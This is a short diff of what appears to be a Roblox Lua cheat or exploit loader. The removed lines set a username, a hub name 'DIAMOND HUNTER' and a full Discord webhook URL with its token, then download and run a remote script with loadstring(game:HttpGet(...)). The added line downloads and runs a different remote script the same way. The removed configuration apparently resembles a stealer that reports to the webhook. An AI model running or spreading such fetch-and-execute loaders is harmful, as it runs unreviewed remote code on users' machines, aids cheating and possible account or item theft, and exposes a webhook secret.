@@ -1,5 +1,1 @@
-_G.Username = "UDAIX238"
-_G.HubName = "DIAMOND HUNTER"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1097087545487147008/9_ODPM-l1TzbrwOiPNuu7wTbu8R1p2dEVYRqOQTQO8qrE70u0FcjYWep7bgHsT63tnVG"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/x3fall3nangel/FallAngelHub/main/DriveWorld.lua"))()
